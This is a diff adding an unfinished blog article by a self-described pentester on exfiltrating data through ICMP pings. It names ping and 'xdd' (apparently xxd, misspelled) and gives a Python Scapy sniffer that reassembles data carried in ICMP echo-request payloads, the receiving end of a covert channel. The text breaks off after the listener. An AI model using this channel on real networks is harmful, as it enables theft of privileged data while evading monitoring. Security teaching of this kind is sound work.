@@ -1,0 +1,59 @@
+export const article = {
+  date: '2025-05-04',
+  title: 'ICMP Exfiltration',
+  tags: ['Incomplete'],
+  description:
+    'Sophisticated way to steal privileged information through an ICMP trace',
+  author: {
+    name: '@Entr0phy4 (David Agámez)',
+    role: 'Pentester',
+  },
+}
+
+export const sections = [{ id: 'introduction', title: 'Introduction' }]
+
+export const metadata = {
+  title: article.title,
+  description: article.description,
+}
+
+## Introduction {{ id: 'introduction' }}
+
+For this technique we will use two fundamental tools in the day to day life of security analyst, **ping** and **xdd**.
+
+- **ping**: Ping is used to determine whether the local host can successfully exchange, send and receive data packets with another host
+
+- **xdd**: In _Linux_, xdd is a utility command that converts a file into it's hexdecimal representation and optionally display it along with an ASCII representation. It can also be used to conver a hexadecimal file back to its original binary format.
+
+In addition to this, we will use the Python [Scapy](https://scapy.net/) library to create a little sniffer to intercept the packets.
+
+```python
+#!/usr/bin/python3
+
+from scapy.all import *
+import signal
+import sys
+import argparse
+
+def handler(sig, frame):
+  print("\n\t [!] Exiting.")
+  sys.exit(1)
+
+
+signal.signal(signal.SIGINT, handler)
+
+def data_parser(packet):
+  if ICMP in packet and packet[ICMP].type == 8 and hasattr(packet[ICMP], "load"):
+      try:
+          data = packet[ICMP].load[-4:].decode("utf-8")
+          print(data, flush=True, end="")
+      except Exception as e:
+          print(f"\n[!] Error decoding data: {e}")
+
+if __name__ == "__main__":
+  parser = argparse.ArgumentParser()
+  parser.add_argument("-i", "--iface", default="lo", help="Interface to sniff on")
+  args = parser.parse_args()
+  print("[*] Sniffing... Press Ctrl+C to stop.")
+  sniff(iface=args.iface, filter="icmp", prn=data_parser)
+```
